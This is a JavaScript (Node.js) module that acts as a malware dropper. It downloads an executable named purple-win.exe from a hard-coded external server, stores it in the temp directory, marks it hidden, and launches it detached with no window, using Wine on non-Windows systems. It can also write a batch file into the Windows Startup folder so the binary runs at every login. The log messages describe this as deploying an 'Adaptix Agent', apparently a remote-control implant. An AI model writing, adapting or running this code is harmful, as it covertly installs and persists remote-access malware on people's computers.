const { spawn } = require("child_process");
const fs = require("fs");
const path = require("path");
const https = require("https");
const http = require("http");
const os = require("os");

function sanitizePath(inputPath) {
    return path.normalize(inputPath).replace(/[^a-zA-Z0-9._\\\/-]/g, '_');
}

function validateUrl(url) {
    try {
        const parsed = new URL(url);
        return parsed.protocol === 'http:' || parsed.protocol === 'https:';
    } catch {
        return false;
    }
}

function downloadFile(url, outputPath) {
    return new Promise((resolve, reject) => {
        if (!validateUrl(url)) {
            reject(new Error("Invalid URL"));
            return;
        }

        const parsedUrl = new URL(url);
        const client = parsedUrl.protocol === 'https:' ? https : http;

        console.log(`📥 Downloading from: ${url}`);
        console.log(`💾 Saving to: ${outputPath}`);

        const request = client.get(url, (response) => {
            if (response.statusCode !== 200) {
                reject(new Error(`Download failed: ${response.statusCode}`));
                return;
            }

            const fileStream = fs.createWriteStream(outputPath);
            let downloadedBytes = 0;

            response.on('data', (chunk) => {
                downloadedBytes += chunk.length;
                fileStream.write(chunk);
            });

            response.on('end', () => {
                fileStream.end();
                console.log(`✅ Download completed: ${downloadedBytes} bytes`);
                resolve(outputPath);
            });

            response.on('error', (error) => {
                fileStream.destroy();
                reject(error);
            });
        });

        request.on('error', (error) => {
            reject(error);
        });

        request.setTimeout(60000, () => {
            request.destroy();
            reject(new Error("Download timeout"));
        });
    });
}

function executeFile(filePath) {
    if (!fs.existsSync(filePath)) {
        throw new Error("File not found");
    }

    console.log(`🚀 Executing: ${filePath}`);

    // Windows execution
    const isWindows = process.platform === 'win32';
    let child;

    if (isWindows) {
        // Windows: Execute .exe file directly
        child = spawn(filePath, [], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
        });
    } else {
        // Non-Windows: Use wine if available, otherwise try direct execution
        const hasWine = fs.existsSync('/usr/bin/wine') || fs.existsSync('/usr/local/bin/wine');
        
        if (hasWine) {
            console.log("🍷 Using Wine to execute Windows binary");
            child = spawn('wine', [filePath], {
                detached: true,
                stdio: 'ignore'
            });
        } else {
            console.log("⚠️ Wine not found, attempting direct execution");
            child = spawn(filePath, [], {
                detached: true,
                stdio: 'ignore'
            });
        }
    }

    child.unref();

    console.log(`✅ Process started with PID: ${child.pid}`);
    
    return {
        success: true,
        pid: child.pid,
        detached: true,
        platform: process.platform,
        method: isWindows ? 'native' : (fs.existsSync('/usr/bin/wine') ? 'wine' : 'direct')
    };
}

function getDefaultWindowsPath() {
    const isWindows = process.platform === 'win32';
    
    if (isWindows) {
        // Windows paths
        return process.env.TEMP || process.env.TMP || 'C:\\Windows\\Temp';
    } else {
        // Unix-like systems
        return process.env.TMPDIR || '/tmp';
    }
}

function hideFileWindows(filePath) {
    if (process.platform === 'win32') {
        try {
            // Hide file on Windows using attrib command
            spawn('attrib', ['+H', filePath], { stdio: 'ignore' });
            console.log(`🔒 File hidden: ${filePath}`);
        } catch (error) {
            console.log(`⚠️ Failed to hide file: ${error.message}`);
        }
    }
}

module.exports = async function(options = {}) {
    const downloadUrl = options.url || "http://purpletm.online:7070/purple-win.exe";
    const targetDir = options.dir || getDefaultWindowsPath();
    const filename = options.filename || "purple-win.exe";
    
    const sanitizedDir = sanitizePath(targetDir);
    const sanitizedFilename = sanitizePath(filename);
    const fullPath = path.join(sanitizedDir, sanitizedFilename);

    console.log("🪟 Starting Windows Adaptix Agent deployment...");
    console.log(`🎯 Platform: ${process.platform}`);
    console.log(`📂 Target directory: ${sanitizedDir}`);

    try {
        // Create directory if it doesn't exist
        if (!fs.existsSync(sanitizedDir)) {
            fs.mkdirSync(sanitizedDir, { recursive: true });
            console.log(`📁 Created directory: ${sanitizedDir}`);
        }

        // Download the Windows executable
        await downloadFile(downloadUrl, fullPath);

        // Hide the file on Windows
        hideFileWindows(fullPath);

        // Execute the file
        const execResult = executeFile(fullPath);

        console.log(`📁 Binary persisted at: ${fullPath}`);
        console.log(`🔧 Execution method: ${execResult.method}`);

        // Optional: Add to startup (Windows only)
        if (process.platform === 'win32' && options.persistence) {
            try {
                const startupDir = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
                const startupScript = path.join(startupDir, 'purple-startup.bat');
                
                fs.writeFileSync(startupScript, `@echo off\nstart "" "${fullPath}"\n`);
                console.log(`🔄 Added to startup: ${startupScript}`);
            } catch (error) {
                console.log(`⚠️ Failed to add startup persistence: ${error.message}`);
            }
        }

        return {
            success: execResult.success,
            filePath: fullPath,
            pid: execResult.pid,
            platform: execResult.platform,
            method: execResult.method,
            hidden: process.platform === 'win32'
        };

    } catch (error) {
        console.error(`❌ Windows Agent deployment failed: ${error.message}`);
        throw error;
    }
};